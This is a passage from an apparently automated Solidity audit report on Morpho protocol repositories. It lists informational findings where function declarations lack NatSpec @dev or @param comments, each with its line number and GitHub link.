/// @audit missed @dev
67:     constructor(

/// @audit missed @dev
94:     function borrowRateView(MarketParams memory marketParams, Market memory market) external view returns (uint256) {

/// @audit missed @dev
100:     function borrowRate(MarketParams memory marketParams, Market memory market) external returns (uint256) {

```

[67](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L67), [94](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L94), [100](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L100)

```solidity
File: morpho-blue-irm/src/libraries/MathLib.sol

/// @audit missed @dev
13:     function wMulDown(int256 a, int256 b) internal pure returns (int256) {

/// @audit missed @dev
17:     function wDivDown(int256 a, int256 b) internal pure returns (int256) {

```

[13](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/libraries/MathLib.sol#L13), [17](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/libraries/MathLib.sol#L17)

```solidity
File: morpho-blue-oracles/src/ChainlinkOracle.sol

/// @audit missed @dev
116:     function price() external view returns (uint256) {

```

[116](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/ChainlinkOracle.sol#L116)

```solidity
File: morpho-blue-oracles/src/interfaces/AggregatorV3Interface.sol

/// @audit missed @dev
7:     function decimals() external view returns (uint8);

/// @audit missed @dev
9:     function description() external view returns (string memory);

/// @audit missed @dev
11:     function version() external view returns (uint256);

/// @audit missed @dev
13:     function getRoundData(uint80 _roundId)

/// @audit missed @dev
18:     function latestRoundData()

```

[7](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/AggregatorV3Interface.sol#L7), [9](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/AggregatorV3Interface.sol#L9), [11](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/AggregatorV3Interface.sol#L11), [13](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/AggregatorV3Interface.sol#L13), [18](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/AggregatorV3Interface.sol#L18)

```solidity
File: morpho-blue-oracles/src/interfaces/IERC4626.sol

/// @audit missed @dev
5:     function convertToAssets(uint256) external view returns (uint256);

```

[5](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/IERC4626.sol#L5)

```solidity
File: universal-rewards-distributor/src/UniversalRewardsDistributor.sol

/// @audit missed @dev
163:     function setRootUpdater(address updater, bool active) external onlyOwner {

/// @audit missed @dev
172:     function setOwner(address newOwner) external onlyOwner {

```

[163](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L163), [172](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L172)

```solidity
File: universal-rewards-distributor/src/UrdFactory.sol

/// @audit missed @dev
26:     function createUrd(

```

[26](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UrdFactory.sol#L26)

```solidity
File: universal-rewards-distributor/src/interfaces/IUniversalRewardsDistributor.sol

/// @audit missed @dev
18:     function root() external view returns (bytes32);

/// @audit missed @dev
19:     function owner() external view returns (address);

/// @audit missed @dev
20:     function timelock() external view returns (uint256);

/// @audit missed @dev
21:     function ipfsHash() external view returns (bytes32);

/// @audit missed @dev
22:     function isUpdater(address) external view returns (bool);

/// @audit missed @dev
23:     function claimed(address, address) external view returns (uint256);

/// @audit missed @dev
25:     function acceptRoot() external;

/// @audit missed @dev
26:     function setRoot(bytes32 newRoot, bytes32 newIpfsHash) external;

/// @audit missed @dev
27:     function setTimelock(uint256 newTimelock) external;

/// @audit missed @dev
28:     function setRootUpdater(address updater, bool active) external;

/// @audit missed @dev
29:     function revokePendingRoot() external;

/// @audit missed @dev
30:     function setOwner(address newOwner) external;

/// @audit missed @dev
32:     function submitRoot(bytes32 newRoot, bytes32 ipfsHash) external;

/// @audit missed @dev
34:     function claim(address account, address reward, uint256 claimable, bytes32[] memory proof)

/// @audit missed @dev
43:     function pendingRoot() external view returns (bytes32 root, bytes32 ipfsHash, uint256 validAt);

/// @audit missed @dev
52:     function pendingRoot() external view returns (PendingRoot memory);

```

[18](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L18), [19](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L19), [20](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L20), [21](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L21), [22](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L22), [23](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L23), [25](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L25), [26](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L26), [27](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L27), [28](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L28), [29](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L29), [30](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L30), [32](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L32), [34](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L34), [43](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L43), [52](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L52)




### Function declaration should include NatSpec `@param` documentation	_(duplicate of [NatSpec: Functions declarations should have @notice, @param and @return tags and NatSpec descriptions])_

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_


*Instances (153)*:


```solidity
File: erc20-permissioned/src/ERC20PermissionedBase.sol

/// @audit missed @param (account)
52:     function hasPermission(address account) public view virtual returns (bool) {

/// @audit missed @param (from, to, value)
66:     function _update(address from, address to, uint256 value) internal virtual override {

```

[52](https://github.com/morpho-org/erc20-permissioned/tree/5176577690da4611a2c4de7a2591d431458ffb27/src/ERC20PermissionedBase.sol#L52), [66](https://github.com/morpho-org/erc20-permissioned/tree/5176577690da4611a2c4de7a2591d431458ffb27/src/ERC20PermissionedBase.sol#L66)

```solidity
File: metamorpho/src/MetaMorpho.sol

/// @audit missed @param (newCurator)
186:     function setCurator(address newCurator) external onlyOwner {

/// @audit missed @param (newAllocator, newIsAllocator)
195:     function setIsAllocator(address newAllocator, bool newIsAllocator) external onlyOwner {

/// @audit missed @param (newSkimRecipient)
204:     function setSkimRecipient(address newSkimRecipient) external onlyOwner {

/// @audit missed @param (newTimelock)
215:     function submitTimelock(uint256 newTimelock) external onlyOwner {

/// @audit missed @param (newFee)
233:     function setFee(uint256 newFee) external onlyOwner {

/// @audit missed @param (newFeeRecipient)
248:     function setFeeRecipient(address newFeeRecipient) external onlyOwner {

/// @audit missed @param (newGuardian)
265:     function submitGuardian(address newGuardian) external onlyOwner {

/// @audit missed @param (marketParams, newSupplyCap)
286:     function submitCap(MarketParams memory marketParams, uint256 newSupplyCap) external onlyCuratorRole {

/// @audit missed @param (id)
308:     function submitMarketRemoval(Id id) external onlyCuratorRole {

/// @audit missed @param (allocations)
397:     function reallocate(MarketAllocation[] calldata allocations) external onlyAllocatorRole {

/// @audit missed @param (id)
469:     function revokePendingCap(Id id) external onlyCuratorOrGuardianRole {

/// @audit missed @param (id)
478:     function revokePendingMarketRemoval(Id id) external onlyCuratorOrGuardianRole {

/// @audit missed @param (id)
507:     function acceptCap(Id id) external afterTimelock(pendingCap[id].validAt) {

/// @audit missed @param (token)
513:     function skim(address token) external {

/// @audit missed @param ()
531:     function maxDeposit(address) public view override returns (uint256) {

/// @audit missed @param ()
536:     function maxMint(address) public view override returns (uint256) {

/// @audit missed @param (owner)
545:     function maxWithdraw(address owner) public view override returns (uint256 assets) {

/// @audit missed @param (owner)
552:     function maxRedeem(address owner) public view override returns (uint256) {

/// @audit missed @param (assets, receiver)
559:     function deposit(uint256 assets, address receiver) public override returns (uint256 shares) {

/// @audit missed @param (shares, receiver)
572:     function mint(uint256 shares, address receiver) public override returns (uint256 assets) {

/// @audit missed @param (assets, receiver, owner)
585:     function withdraw(uint256 assets, address receiver, address owner) public override returns (uint256 shares) {

/// @audit missed @param (shares, receiver, owner)
599:     function redeem(uint256 shares, address receiver, address owner) public override returns (uint256 assets) {

/// @audit missed @param (owner)
628:     function _maxWithdraw(address owner)

/// @audit missed @param (assets, rounding)
657:     function _convertToShares(uint256 assets, Math.Rounding rounding) internal view override returns (uint256) {

/// @audit missed @param (shares, rounding)
665:     function _convertToAssets(uint256 shares, Math.Rounding rounding) internal view override returns (uint256) {

/// @audit missed @param (assets, newTotalSupply, newTotalAssets, rounding)
673:     function _convertToSharesWithTotals(

/// @audit missed @param (shares, newTotalSupply, newTotalAssets, rounding)
684:     function _convertToAssetsWithTotals(

/// @audit missed @param (caller, receiver, assets, shares)
695:     function _deposit(address caller, address receiver, uint256 assets, uint256 shares) internal override {

/// @audit missed @param (caller, receiver, owner, assets, shares)
711:     function _withdraw(address caller, address receiver, address owner, uint256 assets, uint256 shares)

/// @audit missed @param (id)
723:     function _marketParams(Id id) internal view returns (MarketParams memory) {

/// @audit missed @param (marketParams, id)
730:     function _accruedSupplyBalance(MarketParams memory marketParams, Id id)

/// @audit missed @param (newTimelock)
742:     function _checkTimelockBounds(uint256 newTimelock) internal pure {

/// @audit missed @param (newTimelock)
748:     function _setTimelock(uint256 newTimelock) internal {

/// @audit missed @param (newGuardian)
757:     function _setGuardian(address newGuardian) internal {

/// @audit missed @param (id, supplyCap)
766:     function _setCap(Id id, uint184 supplyCap) internal {

/// @audit missed @param (assets)
797:     function _supplyMorpho(uint256 assets) internal {

/// @audit missed @param (assets)
823:     function _withdrawMorpho(uint256 assets) internal {

/// @audit missed @param (assets)
848:     function _simulateWithdrawMorpho(uint256 assets) internal view returns (uint256) {

/// @audit missed @param (marketParams, totalSupplyAssets, totalBorrowAssets, supplyAssets)
878:     function _withdrawable(

/// @audit missed @param (updatedTotalAssets)
895:     function _updateLastTotalAssets(uint256 updatedTotalAssets) internal {

```

[186](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L186), [195](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L195), [204](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L204), [215](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L215), [233](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L233), [248](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L248), [265](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L265), [286](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L286), [308](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L308), [397](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L397), [469](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L469), [478](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L478), [507](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L507), [513](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L513), [531](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L531), [536](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L536), [545](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L545), [552](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L552), [559](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L559), [572](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L572), [585](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L585), [599](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L599), [628](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L628), [657](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L657), [665](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L665), [673](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L673), [684](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L684), [695](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L695), [711](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L711), [723](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L723), [730](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L730), [742](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L742), [748](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L748), [757](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L757), [766](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L766), [797](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L797), [823](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L823), [848](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L848), [878](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L878), [895](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L895)

```solidity
File: metamorpho/src/interfaces/IMetaMorpho.sol

/// @audit missed @param ()
19:     function multicall(bytes[] calldata) external returns (bytes[] memory);

/// @audit missed @param ()
24:     function transferOwnership(address) external;

/// @audit missed @param (target)
36:     function isAllocator(address target) external view returns (bool);

/// @audit missed @param ()
43:     function supplyQueue(uint256) external view returns (Id);

/// @audit missed @param ()
45:     function withdrawQueue(uint256) external view returns (Id);

/// @audit missed @param (newTimelock)
50:     function submitTimelock(uint256 newTimelock) external;

/// @audit missed @param (marketParams, supplyCap)
54:     function submitCap(MarketParams memory marketParams, uint256 supplyCap) external;

/// @audit missed @param (id)
55:     function acceptCap(Id id) external;

/// @audit missed @param (id)
56:     function revokePendingCap(Id id) external;

/// @audit missed @param (id)
58:     function submitMarketRemoval(Id id) external;

/// @audit missed @param (id)
59:     function revokePendingMarketRemoval(Id id) external;

/// @audit missed @param (newGuardian)
61:     function submitGuardian(address newGuardian) external;

/// @audit missed @param ()
65:     function skim(address) external;

/// @audit missed @param (newAllocator, newIsAllocator)
67:     function setIsAllocator(address newAllocator, bool newIsAllocator) external;

/// @audit missed @param (newCurator)
68:     function setCurator(address newCurator) external;

/// @audit missed @param (newFee)
69:     function setFee(uint256 newFee) external;

/// @audit missed @param (newFeeRecipient)
70:     function setFeeRecipient(address newFeeRecipient) external;

/// @audit missed @param ()
71:     function setSkimRecipient(address) external;

/// @audit missed @param (newSupplyQueue)
73:     function setSupplyQueue(Id[] calldata newSupplyQueue) external;

/// @audit missed @param (indexes)
74:     function updateWithdrawQueue(uint256[] calldata indexes) external;

/// @audit missed @param (allocations)
75:     function reallocate(MarketAllocation[] calldata allocations) external;

/// @audit missed @param ()
81:     function config(Id) external view returns (uint184 cap, bool enabled, uint64 removableAt);

/// @audit missed @param ()
83:     function pendingCap(Id) external view returns (uint192 value, uint64 validAt);

/// @audit missed @param ()
92:     function config(Id) external view returns (MarketConfig memory);

/// @audit missed @param ()
94:     function pendingCap(Id) external view returns (PendingUint192 memory);

```

[19](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L19), [24](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L24), [36](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L36), [43](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L43), [45](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L45), [50](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L50), [54](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L54), [55](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L55), [56](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L56), [58](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L58), [59](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L59), [61](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L61), [65](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L65), [67](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L67), [68](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L68), [69](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L69), [70](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L70), [71](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L71), [73](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L73), [74](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L74), [75](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L75), [81](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L81), [83](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L83), [92](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L92), [94](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L94)

```solidity
File: metamorpho/src/interfaces/IMorphoMarketParams.sol

/// @audit missed @param (id)
7:     function idToMarketParams(Id id) external view returns (MarketParams memory marketParams);

```

[7](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMorphoMarketParams.sol#L7)

```solidity
File: morpho-blue-bundlers/src/BaseBundler.sol

/// @audit missed @param (data)
51:     function multicall(bytes[] memory data) external payable {

/// @audit missed @param (data)
65:     function _multicall(bytes[] memory data) internal {

/// @audit missed @param (returnData)
76:     function _revert(bytes memory returnData) internal pure {

/// @audit missed @param (asset, spender)
93:     function _approveMaxTo(address asset, address spender) internal {

```

[51](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L51), [65](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L65), [76](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L76), [93](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L93)

```solidity
File: morpho-blue-bundlers/src/MorphoBundler.sol

/// @audit missed @param (morpho)
26:     constructor(address morpho) {

/// @audit missed @param (, data)
34:     function onMorphoSupply(uint256, bytes calldata data) external {

/// @audit missed @param (, data)
39:     function onMorphoSupplyCollateral(uint256, bytes calldata data) external {

/// @audit missed @param (, data)
44:     function onMorphoRepay(uint256, bytes calldata data) external {

/// @audit missed @param (, data)
49:     function onMorphoLiquidate(uint256, bytes calldata data) external {

/// @audit missed @param (, data)
54:     function onMorphoFlashLoan(uint256, bytes calldata data) external {

/// @audit missed @param (data)
272:     function _callback(bytes calldata data) internal {

```

[26](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L26), [34](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L34), [39](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L39), [44](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L44), [49](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L49), [54](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L54), [272](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L272)

```solidity
File: morpho-blue-bundlers/src/ethereum/EthereumBundler.sol

/// @audit missed @param (morpho)
34:     constructor(address morpho) WNativeBundler(MainnetLib.WETH) MorphoBundler(morpho) {}

```

[34](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/EthereumBundler.sol#L34)

```solidity
File: morpho-blue-bundlers/src/interfaces/IStEth.sol

/// @audit missed @param (_recipient, _sharesAmount)
5:     function transferShares(address _recipient, uint256 _sharesAmount) external returns (uint256);

/// @audit missed @param (_sharesAmount)
7:     function getPooledEthByShares(uint256 _sharesAmount) external view returns (uint256);

/// @audit missed @param (_stEthAmount)
9:     function getSharesByPooledEth(uint256 _stEthAmount) external view returns (uint256);

/// @audit missed @param (_referral)
13:     function submit(address _referral) external payable returns (uint256);

```

[5](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IStEth.sol#L5), [7](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IStEth.sol#L7), [9](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IStEth.sol#L9), [13](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IStEth.sol#L13)

```solidity
File: morpho-blue-bundlers/src/interfaces/IWNative.sol

/// @audit missed @param (wad)
6:     function withdraw(uint256 wad) external;

/// @audit missed @param (guy, wad)
7:     function approve(address guy, uint256 wad) external returns (bool);

/// @audit missed @param (src, dst, wad)
8:     function transferFrom(address src, address dst, uint256 wad) external returns (bool);

```

[6](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWNative.sol#L6), [7](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWNative.sol#L7), [8](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWNative.sol#L8)

```solidity
File: morpho-blue-bundlers/src/interfaces/IWstEth.sol

/// @audit missed @param (owner, spender)
7:     function allowance(address owner, address spender) external view returns (uint256);

/// @audit missed @param (spender, amount)
8:     function approve(address spender, uint256 amount) external returns (bool);

/// @audit missed @param (account)
9:     function balanceOf(address account) external view returns (uint256);

/// @audit missed @param (spender, subtractedValue)
11:     function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool);

/// @audit missed @param (wstETHAmount)
12:     function getStETHByWstETH(uint256 wstETHAmount) external view returns (uint256);

/// @audit missed @param (stETHAmount)
13:     function getWstETHByStETH(uint256 stETHAmount) external view returns (uint256);

/// @audit missed @param (spender, addedValue)
14:     function increaseAllowance(address spender, uint256 addedValue) external returns (bool);

/// @audit missed @param (owner)
16:     function nonces(address owner) external view returns (uint256);

/// @audit missed @param (owner, spender, value, deadline, v, r, s)
17:     function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)

/// @audit missed @param (recipient, amount)
24:     function transfer(address recipient, uint256 amount) external returns (bool);

/// @audit missed @param (sender, recipient, amount)
25:     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

/// @audit missed @param (wstETHAmount)
26:     function unwrap(uint256 wstETHAmount) external returns (uint256);

/// @audit missed @param (stETHAmount)
27:     function wrap(uint256 stETHAmount) external returns (uint256);

```

